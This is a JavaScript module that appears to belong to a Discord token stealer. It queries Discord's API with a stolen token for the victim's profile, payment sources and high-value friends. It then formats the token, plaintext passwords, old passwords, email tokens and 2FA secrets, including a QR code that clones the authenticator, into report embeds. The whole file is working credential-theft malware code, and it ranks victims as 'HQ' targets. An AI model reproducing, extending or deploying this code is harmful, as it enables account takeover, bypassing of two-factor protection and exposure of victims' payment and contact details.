const Embed = require("./Embed");
const GlobalUtil = require("./GlobalUtil");

const PAYMENT_TYPES = {
  1: "cards",
  2: "paypal",
  3: "giropay",
  4: "sofort",
  7: "paysafecard"
};

const USER_FLAGS = [
  {
    n: 1 << 0,
    t: "STAFF",
    e: "<:Discord_Staff:1163542701829013537>",
    hq: true
  },
  {
    n: 1 << 1,
    t: "PARTNER",
    e: "<:Discord_Partner:1163542699912220693>",
    hq: true
  },
  {
    n: 1 << 2,
    t: "HYPESQUAD",
    e: "<:HypeSquad_Event:1163542726172745819>",
    hq: true
  },
  {
    n: 1 << 3,
    t: "BUG_HUNTER",
    e: "<:Bug_Hunter_Level_1:1163542686058430644>",
    hq: true
  },
  {
    n: 1 << 6,
    t: "BRAVERY",
    e: "<:HypeSquad_Bravery:1163542718065152162>"
  },
  {
    n: 1 << 7,
    t: "BRILLIANCE",
    e: "<:HypeSquad_Brilliance:1163542722435616838>"
  },
  {
    n: 1 << 8,
    t: "BALANCE",
    e: "<:HypeSquad_Balance:1163542712943902901>"
  },
  {
    n: 1 << 9,
    t: "EARLY_SUPPORTER",
    e: "<:Early_Supporter:1163542706472095879>",
    hq: true
  },
  {
    n: 1 << 14,
    t: "BUG_HUNTER_2",
    e: "<:Bug_Hunter_Level_2:1163542691234189332>",
    hq: true
  },
  {
    n: 1 << 17,
    t: "VERIFIED_DEVELOPER",
    e: "<:Verified_Bot_Developer:1163542728781611008>",
    hq: true
  },
  {
    n: 1 << 18,
    t: "CERTIFIED_MODERATOR",
    e: "<:Certified_Moderator:1163542695675969587>",
    hq: true
  },
  {
    n: 1 << 22,
    t: "ACTIVE_DEVELOPER",
    e: "<:Active_Developer:1163542681780240394>"
  }
];

const PAYMENT_EMOJIS = {
  cards: "💳",
  paypal: "<:Paypal:1163197834233909368> ",
  sofort: "<:Sofort:1163197840449867859>",
  giropay: "<:Giropay:1163197829561458748> ",
  paysafecard: "<:PaySafeCard:1163552425853079685>"
};

const PREMIUM_TYPES = {
  0: "No Nitro",
  1: "Nitro Classic",
  2: "Nitro Boost",
  3: "Nitro Basic"
};

const TITLE_TYPES = {
  login: "User Logged",
  email: "Email Changed",
  password: "Password Changed",
  mfaEnabled: "2FA Enabled",
  mfaDisabled: "2FA Disabled"
};

class DiscordUser {
  constructor(request, report) {
    this.request = request;
    this.report = report;
  }

  generateMfaChart(secret, logo, email) {
    try {
      const params = new URLSearchParams();
      const name = email ? `Discord: ${email}` : "Discord";

      params.set(
        "text",
        `otpauth://totp/${name}?secret=${secret}&issuer=Discord`
      );

      if (logo) {
        params.set("centerImageUrl", logo);
        params.set("ecLevel", "H");
      }

      return "https://quickchart.io/qr?" + params;
    } catch (e) {
      return this.report(e);
    }
  }

  generateEmbedTitle(user, source) {
    const isQuality = !!user.badges.find((b) => b.hq);

    let title = "Token";

    if (isQuality) title = "HQ Token ❗❗❗";

    if (source) title = `${GlobalUtil.snakeToTitle(source)} ${title}`;

    if (TITLE_TYPES[user.type]) title = TITLE_TYPES[user.type];

    return title;
  }

  generateEmbeds(user, source) {
    try {
      const e = new Embed()
        .setTitle(this.generateEmbedTitle(user, source))
        .setAuthor(`@${user.username} (${user.id})`, user.avatarUrl)
        .addFooter(`Created: ${this.parseId(user.id)}`)
        .addField("Token", user.token);

      if (user.emailToken) {
        e.addField("Email Token", user.emailToken).addField(
          "Verify Email",
          `[Click here to verify](https://discord.com/verify#token=${user.emailToken})`
        );
      }

      // prettier-ignore
      e.addField("Badges", user.badges.length ? this.stringifyBadges(user.badges) : "```Empty```", true, false)
      .addField("Nitro", user.nitro, true);

      // prettier-ignore
      e.addField("Payments", this.stringifyPayments(user.payments), true, false);

      if (user.type === "login") {
        e.addField("Password", user.password, true);
      } else if (user.type === "password") {
        // prettier-ignore
        e.setDescription(`**Old Password:** \`${user.oldPassword}\` | **Current Password:** \`${user.password}\``)
        .addField("Password", user.password, true)
      } else if (user.type === "mfaEnabled") {
        e.addField("Password", user.password, true)
          .addField("2FA Secret", user.secret, true)
          .setThumbnail(
            this.generateMfaChart(user.secret, e.footer.iconURL, user.email)
          );
      }

      e.addField("Email", user.email, true);
      if (!user.password) e.addField("Phone", user.phone, true);

      if (user.type !== "mfaEnabled")
        e.addField("2FA Enabled", user.mfa ? "✅" : "❌", true);

      let friendsEmebed;
      if (Array.isArray(user.qualityFriends) && user.qualityFriends.length) {
        friendsEmebed = new Embed()
          .setAuthor(`HQ Friends (${user.id})`, user.avatarUrl)
          .setDescription(this.stringifyFriends(user.qualityFriends));
      }

      return [e, friendsEmebed].filter(Boolean);
    } catch (e) {
      return this.report(e, []);
    }
  }

  parseUsername(username, discrim) {
    return username + (discrim == "0" ? "" : discrim);
  }

  parseAvatar(id, hash) {
    const upath = hash ? `/avatars/${id}/${hash}.webp` : `/embed/avatars/1.png`;

    return "https://cdn.discordapp.com" + upath;
  }

  parseBadges(flags) {
    return USER_FLAGS.filter((f) => (flags & f.n) === f.n);
  }

  parseId(id) {
    const bin = (+id).toString(2);
    const unixbin = bin.substring(0, 42 - (64 - bin.length));
    const time = parseInt(unixbin, 2) + 1420070400000;

    return new Date(time).toLocaleDateString("en-GB");
  }

  stringifyBadges(badges, qualityOnly = false) {
    return badges
      .filter((b) => (qualityOnly ? b.hq : b))
      .map((b) => b.e)
      .join(" ");
  }

  stringifyFriends(friends) {
    return friends
      .map(
        // prettier-ignore
        (friend) => `${this.stringifyBadges(friend.badges, true)} \\| ||**@${friend.username} (\`${friend.id}\`)**||`
      )
      .join("\n");
  }

  stringifyPayments(data) {
    const entries = Object.entries(data);
    const payments = entries
      .map(
        ([provider, amount]) =>
          amount && `${PAYMENT_EMOJIS[provider]} ${amount}`
      )
      .filter(Boolean);

    return "**" + (payments.length ? payments.join(" ") : "No Payments") + "**";
  }

  async fetch(token) {
    const headers = {
      Authorization: token,
      "Content-Type": "application/json",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    };

    const userRes = await this.request(
      "https://discord.com/api/v10/users/@me",
      {
        headers
      }
    ).catch((e) => this.report(e, {}));

    if (!userRes.ok) return;

    const user = await userRes.json().catch((e) => this.report(e, {}));

    const payments = {
      cards: 0,
      paypal: 0,
      sofort: 0,
      giropay: 0,
      paysafecard: 0
    };

    const billing = await this.fetchBilling(headers).catch((e) =>
      this.report(e, [])
    );

    if (Array.isArray(billing)) {
      for (const bill of billing) {
        if (bill.type && PAYMENT_TYPES[bill.type])
          payments[PAYMENT_TYPES[bill.type]]++;
      }
    }

    const qualityFriends = await this.fetchFriends(headers).catch((e) =>
      this.report(e, [])
    );

    return {
      token,
      id: user.id,
      username: this.parseUsername(user.username, user.discriminator),
      avatarUrl: this.parseAvatar(user.id, user.avatar),
      mfa: user.mfa_enabled,
      email: user.email,
      phone: user.phone,
      badges: this.parseBadges(user.flags),
      nitro: PREMIUM_TYPES[user.premium_type],
      payments,
      qualityFriends
    };
  }

  async fetchBilling(headers) {
    const res = await this.request(
      "https://discord.com/api/v9/users/@me/billing/payment-sources",
      { headers }
    );

    return await res.json();
  }

  async fetchFriends(headers) {
    const res = await this.request(
      "https://discord.com/api/v10/users/@me/relationships",
      { headers }
    );

    const relationships = await res.json();

    return relationships
      .map(({ id, type, user }) => ({
        id,
        type,
        username: this.parseUsername(user.username, user.discriminator),
        badges: this.parseBadges(user.flags)
      }))
      .filter(
        (friend) => friend.type === 1 && !!friend.badges.find((b) => b.hq)
      );
  }
}

module.exports = DiscordUser;
